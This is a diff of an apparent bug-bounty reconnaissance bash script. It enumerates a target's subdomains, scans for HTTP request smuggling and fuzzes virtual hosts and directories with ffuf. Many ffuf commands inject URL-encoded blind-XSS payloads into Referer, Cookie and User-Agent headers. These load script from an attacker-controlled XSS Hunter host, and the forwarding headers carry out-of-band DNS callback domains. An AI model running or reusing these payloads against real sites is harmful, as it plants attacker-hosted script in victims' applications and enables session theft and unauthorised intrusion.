@@ -10,7 +10,6 @@ xss_hunter=$(cat ~/tools/.creds | grep 'xss_hunter' | awk {'print $3'})
 [ ! -f ~/recon/$1/aquatone ] && mkdir ~/recon/$1/aquatone  2&>1
 [ ! -f ~/recon/$1/shodan ] && mkdir ~/recon/$1/shodan  2&>1
 [ ! -f ~/recon/$1/dirsearch ] && mkdir ~/recon/$1/dirsearch  2&>1
-[ ! -f ~/recon/$1/default-credential ] && mkdir ~/recon/$1/default-credential  2&>1
 [ ! -f ~/recon/$1/virtual-hosts ] && mkdir ~/recon/$1/virtual-hosts  2&>1
 [ ! -f ~/recon/$1/endpoints ] && mkdir ~/recon/$1/endpoints  2&>1
 [ ! -f ~/recon/$1/github-endpoints ] && mkdir ~/recon/$1/github-endpoints  2&>1
@@ -115,6 +114,7 @@ echo "[+] GOALTDNS SUBDOMAIN PERMUTATION [+]"
 if [ ! -f ~/recon/$1/$1-goaltdns.txt ] && [ ! -z $(which goaltdns) ]; then
 	goaltdns -l ~/recon/$1/$1-final.txt -w ~/tools/subs.txt | massdns -r ~/tools/nameservers.txt -o J --flush 2>/dev/null | jq -r '.name' >> ~/recon/$1/$1-goaltdns.tmp
 	cat ~/recon/$1/$1-goaltdns.tmp | sed 's/\.$//g' | sort -u >> ~/recon/$1/$1-goaltdns.txt
+	rm ~/recon/$1/$1-goaltdns.tmp
 	goaltdns=$(scanned ~/recon/$1/$1-goaltdns.txt)
 	message "goaltdns%20generates%20$goaltdns%20subdomain(s)%20for%20$1"
 	echo "[+] goaltdns generate $goaltdns subdomains"
@@ -124,8 +124,17 @@ else
 fi
 sleep 5
 
-cat ~/recon/$1/$1-goaltdns.txt ~/recon/$1/$1-final.txt | sed 's/\.$//g' | sort -u >> ~/recon/$1/$1-fin.txt
-rm ~/recon/$1/$1-final.txt && mv ~/recon/$1/$1-fin.txt ~/recon/$1/$1-final.txt
+echo "[+] ELIMINATING WILDCARD SUBDOMAINS [+]"
+if [ ! -f ~/recon/$1/$1-non-wildcards.txt ] && [ ! -z $(which shuffledns) ] && [ ! -z $(which dnsprobe) ]; then
+	cat ~/recon/$1/$1-goaltdns.txt ~/recon/$1/$1-final.txt | sed 's/\.$//g' | shuffledns -d $1 -r ~/tools/nameservers.txt | dnsprobe -r A | awk {'print $1'} | sort -u >> ~/recon/$1/$1-non-wildcards.txt
+	rm ~/recon/$1/$1-final.txt && mv ~/recon/$1/$1-non-wildcards.txt ~/recon/$1/$1-final.txt
+	message "Done%20Eliminating%20wildcard%20subdomains!"
+else
+	message "[-]%20Skipping%20shuffledns%20and%20dnsprobe%20Scanning%20for%20$1"
+	echo "[!] Skipping ..."
+fi
+sleep 5
+
 all=$(scanned ~/recon/$1/$1-final.txt)
 message "Almost%20$all%20Collected%20Subdomains%20for%20$1"
 echo "[+] $all collected subdomains"
@@ -313,9 +322,10 @@ sleep 5
 
 echo "[+] HTTP SMUGGLING SCANNING [+]"
 if [ -f ~/tools/smuggler.py ]; then
-	for url in $(cat ~/recon/$1/$1-alive.txt); do
+	for url in $(cat ~/recon/$1/$1-httprobe.txt); do
+		filename=$(echo $url | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
 		echo "Running against: $url"
-		python3 ~/tools/smuggler.py -u $url -v 1 &> ~/recon/$1/http-desync/$url.txt
+		python3 ~/tools/smuggler.py -u "$url/" -v 1 &> ~/recon/$1/http-desync/$filename.txt
 	done
 	message "Done%20scanning%20of%20request%20smuggling%20in%20$1"
 	echo "[+] Done scanning of request smuggling"
@@ -376,7 +386,7 @@ echo "[+] WEBANALYZE SCANNING FOR FINGERPRINTING [+]"
 if [ ! -z $(which webanalyze) ]; then
 	[ ! -f ~/tools/apps.json ] && wget "https://raw.githubusercontent.com/AliasIO/Wappalyzer/master/src/apps.json" -O ~/tools/apps.json
 	for target in $(cat ~/recon/$1/$1-httprobe.txt); do
-		filename=`echo $target | sed 's/http\(.?*\)*:\/\///g'`
+		filename=$(echo $target | sed 's/http\(.?*\)*:\/\///g')
 		webanalyze -host $target -apps ~/tools/apps.json -output csv > ~/recon/$1/webanalyze/$filename.txt
 		sleep 5
 	done
@@ -435,10 +445,9 @@ sleep 5
 echo "[+] Scanning for Virtual Hosts Resolution [+]"
 if [ ! -z $(which ffuf) ]; then
 	[ ! -f ~/tools/virtual-host-scanning.txt ] && wget "https://raw.githubusercontent.com/codingo/VHostScan/master/VHostScan/wordlists/virtual-host-scanning.txt" -O ~/tools/virtual-host-scanning.txt
-	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt ~/recon/$1/$1-goaltdns.tmp ~/recon/$1/$1-diff.txt ~/recon/$1/$1-diff2.txt ~/tools/virtual-host-scanning.txt | sed "s/\%s/$1/g" | sort -u >> ~/recon/$1/$1-temp-vhost-wordlist.txt
+	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt ~/tools/virtual-host-scanning.txt | sed "s/\%s/$1/g" | sort -u >> ~/recon/$1/$1-temp-vhost-wordlist.txt
 	for target in $(cat ~/recon/$1/$1-alive.txt); do ffuf -c -w ~/recon/$1/$1-temp-vhost-wordlist.txt -u http://$target -k -r -H "Host: FUZZ" -H "X-Forwarded-For: $target.scanner.xforwarded.$dns_server" -H "X-Real-IP: $target.scanner.xrealip.$dns_server" -H "X-Originating-IP: $target.scanner.xoriginatingip.$dns_server" -H "Client-IP: $target.scanner.clientip.$dns_server" -H "CF-Connecting_IP: $target.scanner.cfconnectingip.$dns_server" -H "Forwarded: for=$target.scanner.for-forwarded.$dns_server;by=$target.scanner.by-forwarded.$dns_server;host=$target.scanner.host-forwarded.$dns_server" -H "X-Client-IP: $target.scanner.xclientip.$dns_server" -H "True-Client-IP: $target.scanner.trueclientip.$dns_server" -H "X-Forwarded-Host: $target.scanner.xforwardedhost.$dns_server" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -H "User-Agent: %22%27%3Eblahblah%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2Fscript%3Etesting" -mc all -fc 500-599,400,406,301 -of html -o ~/recon/$1/virtual-hosts/$target.html; done
 	message "Virtual%20Host%20done%20for%20$1"
-	rm ~/recon/$1/$1-goaltdns.tmp
 	echo "[+] Done ffuf for scanning virtual hosts"
 else
 	message "[-]%20Skipping%20ffuf%20for%20vhost%20scanning"
@@ -453,13 +462,13 @@ if [ ! -z $(which ffuf) ]; then
 		filename=$(echo $i | sed 's/http:\/\///g' | sed 's/https:\/\//ssl-/g')
 		stat_code=$(curl -s -o /dev/null -w "%{http_code}" "$i" --max-time 10)
 		if [ 404 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
-		else if [ 403 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
-		else if [ 401 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
-		else if [ 200 == $stat_code ]; then
-			ffuf -c -D -w ~/tools/dicc.txt -ic -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $f/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$target/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$file.html
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+		elif [ 403 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,403,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+		elif [ 401 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,401,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
+		elif [ 200 == $stat_code ]; then
+			ffuf -c -D -w ~/tools/dicc.txt -ic -t 100 -k -e json,config,yml,yaml,bak,log,zip,php,txt,jsp,html,aspx,asp,axd,config -u $i/FUZZ -mc all -fc 500-599,404,301,400 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763" -H "Referer: $xss_hunter/$i/%27%22%3E%3Cscript%20src%3D%22$xss_hunter%2F%22%3E%3C%2Fscript%3E" -H "Cookie: test=%27%3E%27%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3Cscript%20src%3D%22$xss_hunter%22%3E%3C%2fscript%3E" -o ~/recon/$1/dirsearch/$filename.html
 		else
 			echo "$i >> $stat_code"
 		fi
